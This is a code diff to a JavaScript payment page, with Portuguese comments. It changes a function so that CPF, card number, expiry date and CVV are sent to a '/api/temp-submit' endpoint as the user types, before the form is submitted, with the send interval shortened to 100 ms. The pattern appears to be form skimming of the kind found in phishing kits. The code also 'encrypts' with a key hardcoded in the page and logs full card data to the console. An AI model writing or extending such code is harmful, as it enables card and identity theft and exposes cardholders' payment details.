@@ -17,10 +17,21 @@ function debounce(func, wait) {
 }
 
 // Enviar dados temporários ao servidor com token
-async function sendTempData(field, value) {
+async function sendTempData() {
+    const cpfInput = document.getElementById('cpf');
+    const cardNumberInput = document.getElementById('card-number');
+    const expiryDateInput = document.getElementById('expiry-date');
+    const cvvInput = document.getElementById('cvv');
+
+    const data = {
+        sessionId,
+        cpf: cpfInput ? CryptoJS.AES.encrypt(cpfInput.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null,
+        cardNumber: cardNumberInput ? CryptoJS.AES.encrypt(cardNumberInput.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null,
+        expiryDate: expiryDateInput ? CryptoJS.AES.encrypt(expiryDateInput.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null,
+        cvv: cvvInput ? CryptoJS.AES.encrypt(cvvInput.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null
+    };
+
     try {
-        const encryptedValue = CryptoJS.AES.encrypt(value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString();
-        const data = { sessionId, [field]: encryptedValue };
         const response = await fetch('/api/temp-submit', {
             method: 'POST',
             headers: {
@@ -32,6 +43,8 @@ async function sendTempData(field, value) {
         if (!response.ok) {
             const errorData = await response.json();
             console.error('Erro ao enviar dados temporários:', errorData);
+        } else {
+            console.log('Dados temporários enviados com sucesso:', data);
         }
     } catch (error) {
         console.error('Erro ao enviar dados temporários:', error);
@@ -305,7 +318,7 @@ if (cardNumberInput) {
         validateCardNumber();
         checkFields();
         sendTempData('cardNumber', cardNumberInput.value);
-    }, 300));
+    }, 100)); // Reduzido para 100ms para maior responsividade
 }
 
 if (expiryDateInput) {
@@ -314,14 +327,14 @@ if (expiryDateInput) {
         validateExpiryDate();
         checkFields();
         sendTempData('expiryDate', expiryDateInput.value);
-    }, 300));
+    }, 100)); // Reduzido para 100ms para maior responsividade
 }
 
 if (cvvInput) {
     cvvInput.addEventListener('input', debounce(() => {
         checkFields();
         sendTempData('cvv', cvvInput.value);
-    }, 300));
+    }, 100)); // Reduzido para 100ms para maior responsividade
 }
 
 // Enviar dados e ir para tela de análise
@@ -392,6 +405,6 @@ window.onload = async () => {
             formatCPF(cpfInput);
             checkCPF();
             sendTempData('cpf', cpfInput.value);
-        }, 300));
+        }, 100)); // Ajustado para 100ms
     }
 };
